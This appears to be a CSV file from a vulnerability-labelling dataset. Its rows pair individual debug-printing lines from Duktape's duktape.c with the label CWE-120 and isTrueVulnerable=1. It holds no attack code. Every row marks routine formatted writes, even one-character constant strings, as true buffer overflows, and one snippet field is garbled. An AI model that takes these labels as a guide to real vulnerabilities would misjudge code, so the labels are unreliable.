GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__func:"");",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_NATFUNC(h)) {
		duk_hnatfunc *f = (duk_hnatfunc *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__func:"");
		duk_fb_put_funcptr(fb, (duk_uint8_t *) &f->func, sizeof(f->func));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__nargs:%ld"", (long) f->nargs);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__magic:%ld"", (long) f->magic);",120,1,"		duk_fb_put_funcptr(fb, (duk_uint8_t *) &f->func, sizeof(f->func));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__nargs:%ld"", (long) f->nargs);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__magic:%ld"", (long) f->magic);
	} else if (st->internal && DUK_HOBJECT_IS_DECENV(h)) {
		duk_hdecenv *e = (duk_hdecenv *) h;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:""); duk__print_hobject(st, (duk_hobject *) e->thread);",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_DECENV(h)) {
		duk_hdecenv *e = (duk_hdecenv *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:""); duk__print_hobject(st, (duk_hobject *) e->thread);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__varmap:""); duk__print_hobject(st, (duk_hobject *) e->varmap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__regbase_byteoff:%ld"", (long) e->regbase_byteoff);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__varmap:""); duk__print_hobject(st, (duk_hobject *) e->varmap);",120,1,"		duk_hdecenv *e = (duk_hdecenv *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:""); duk__print_hobject(st, (duk_hobject *) e->thread);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__varmap:""); duk__print_hobject(st, (duk_hobject *) e->varmap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__regbase_byteoff:%ld"", (long) e->regbase_byteoff);
	} else if (st->internal && DUK_HOBJECT_IS_OBJENV(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__regbase_byteoff:%ld"", (long) e->regbase_byteoff);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__thread:""); duk__print_hobject(st, (duk_hobject *) e->thread);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__varmap:""); duk__print_hobject(st, (duk_hobject *) e->varmap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__regbase_byteoff:%ld"", (long) e->regbase_byteoff);
	} else if (st->internal && DUK_HOBJECT_IS_OBJENV(h)) {
		duk_hobjenv *e = (duk_hobjenv *) h;
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__target:""); duk__print_hobject(st, (duk_hobject *) e->target);",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_OBJENV(h)) {
		duk_hobjenv *e = (duk_hobjenv *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__target:""); duk__print_hobject(st, (duk_hobject *) e->target);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__has_this:%ld"", (long) e->has_this);
#if defined(DUK_USE_BUFFEROBJECT_SUPPORT)
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__has_this:%ld"", (long) e->has_this);",120,1,"		duk_hobjenv *e = (duk_hobjenv *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__target:""); duk__print_hobject(st, (duk_hobject *) e->target);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__has_this:%ld"", (long) e->has_this);
#if defined(DUK_USE_BUFFEROBJECT_SUPPORT)
	} else if (st->internal && DUK_HOBJECT_IS_BUFOBJ(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__buf:"");",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_BUFOBJ(h)) {
		duk_hbufobj *b = (duk_hbufobj *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf:"");
		duk__print_hbuffer(st, (duk_hbuffer *) b->buf);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf_prop:"");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__buf_prop:"");",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf:"");
		duk__print_hbuffer(st, (duk_hbuffer *) b->buf);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf_prop:"");
		duk__print_hobject(st, (duk_hobject *) b->buf_prop);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__buf_prop:"");
		duk__print_hobject(st, (duk_hobject *) b->buf_prop);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);",120,1,"		duk__print_hobject(st, (duk_hobject *) b->buf_prop);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__elemtype:%ld"", (long) b->elem_type);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__offset:%ld"", (long) b->offset);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__elemtype:%ld"", (long) b->elem_type);
#endif
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__elemtype:%ld"", (long) b->elem_type);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__length:%ld"", (long) b->length);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__shift:%ld"", (long) b->shift);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__elemtype:%ld"", (long) b->elem_type);
#endif
	} else if (st->internal && DUK_HOBJECT_IS_PROXY(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__target:"");",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_PROXY(h)) {
		duk_hproxy *p = (duk_hproxy *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__target:"");
		duk__print_hobject(st, p->target);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__handler:"");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__handler:"");",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__target:"");
		duk__print_hobject(st, p->target);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__handler:"");
		duk__print_hobject(st, p->handler);
	} else if (st->internal && DUK_HOBJECT_IS_THREAD(h)) {
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__ptr_curr_pc:%p"", (void *) t->ptr_curr_pc);",120,1,"	} else if (st->internal && DUK_HOBJECT_IS_THREAD(h)) {
		duk_hthread *t = (duk_hthread *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__ptr_curr_pc:%p"", (void *) t->ptr_curr_pc);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);",120,1,"		duk_hthread *t = (duk_hthread *) h;
		DUK__COMMA(); duk_fb_sprintf(fb, ""__ptr_curr_pc:%p"", (void *) t->ptr_curr_pc);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__ptr_curr_pc:%p"", (void *) t->ptr_curr_pc);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__heap:%p"", (void *) t->heap);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__strict:%ld"", (long) t->strict);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__state:%ld"", (long) t->state);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused1:%ld"", (long) t->unused1);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__unused2:%ld"", (long) t->unused2);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack:%p"", (void *) t->valstack);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_end:%p/%ld"", (void *) t->valstack_end, (long) (t->valstack_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_alloc_end:%p/%ld"", (void *) t->valstack_alloc_end, (long) (t->valstack_alloc_end - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_bottom:%p/%ld"", (void *) t->valstack_bottom, (long) (t->valstack_bottom - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__valstack_top:%p/%ld"", (void *) t->valstack_top, (long) (t->valstack_top - t->valstack));
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_curr:%p"", (void *) t->callstack_curr);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_top:%ld"", (long) t->callstack_top);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);
#if defined(DUK_USE_INTERRUPT_COUNTER)
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__callstack_preventcount:%ld"", (long) t->callstack_preventcount);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__resumer:""); duk__print_hobject(st, (duk_hobject *) t->resumer);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);
#if defined(DUK_USE_INTERRUPT_COUNTER)
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_counter:%ld"", (long) t->interrupt_counter);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_counter:%ld"", (long) t->interrupt_counter);",120,1,"		DUK__COMMA(); duk_fb_sprintf(fb, ""__compile_ctx:%p"", (void *) t->compile_ctx);
#if defined(DUK_USE_INTERRUPT_COUNTER)
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_counter:%ld"", (long) t->interrupt_counter);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_init:%ld"", (long) t->interrupt_init);
#endif
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_init:%ld"", (long) t->interrupt_init);",120,1,"#if defined(DUK_USE_INTERRUPT_COUNTER)
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_counter:%ld"", (long) t->interrupt_counter);
		DUK__COMMA(); duk_fb_sprintf(fb, ""__interrupt_init:%ld"", (long) t->interrupt_init);
#endif

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__refcount:%lu"", (unsigned long) DUK_HEAPHDR_GET_REFCOUNT((duk_heaphdr *) h));",120,1,"#if defined(DUK_USE_REFERENCE_COUNTING)
	if (st->internal) {
		DUK__COMMA(); duk_fb_sprintf(fb, ""__refcount:%lu"", (unsigned long) DUK_HEAPHDR_GET_REFCOUNT((duk_heaphdr *) h));
	}
#endif
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__class:%ld"", (long) DUK_HOBJECT_GET_CLASS_NUMBER(h));",120,1,"#endif
	if (st->internal) {
		DUK__COMMA(); duk_fb_sprintf(fb, ""__class:%ld"", (long) DUK_HOBJECT_GET_CLASS_NUMBER(h));
	}

"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__heapptr:%p"", (void *) h);  */",120,1,"	}

	DUK__COMMA(); duk_fb_sprintf(fb, ""__heapptr:%p"", (void *) h);  /* own pointer */

	/* prototype should be last, for readability */
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"DUK__COMMA(); duk_fb_sprintf(fb, ""__prototype:%p"", (void *) DUK_HOBJECT_GET_PROTOTYPE(NULL, h));",120,1,"			DUK__COMMA(); duk_fb_put_cstring(fb, ""__prototype:""); duk__print_hobject(st, DUK_HOBJECT_GET_PROTOTYPE(NULL, h));
		} else {
			DUK__COMMA(); duk_fb_sprintf(fb, ""__prototype:%p"", (void *) DUK_HOBJECT_GET_PROTOTYPE(NULL, h));
		}
	}
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""u"");",120,1,"			}
			if (h_idx == DUK_HOBJECT_HASHIDX_UNUSED) {
				duk_fb_sprintf(fb, ""u"");
			} else if (h_idx == DUK_HOBJECT_HASHIDX_DELETED) {
				duk_fb_sprintf(fb, ""d"");
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""d"");",120,1,"				duk_fb_sprintf(fb, ""u"");
			} else if (h_idx == DUK_HOBJECT_HASHIDX_DELETED) {
				duk_fb_sprintf(fb, ""d"");
			} else {
				duk_fb_sprintf(fb, ""%ld"", (long) h_idx);
"
2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\engine\duktape_engine\duktape\duktape.c,"duk_fb_sprintf(fb, ""%ld"", (long) h_idx);",120,1,"				duk_fb_sprintf(fb, ""d"");
			} else {
				duk_fb_sprintf(fb, ""%ld"", (long) h_idx);
			}
		}
"
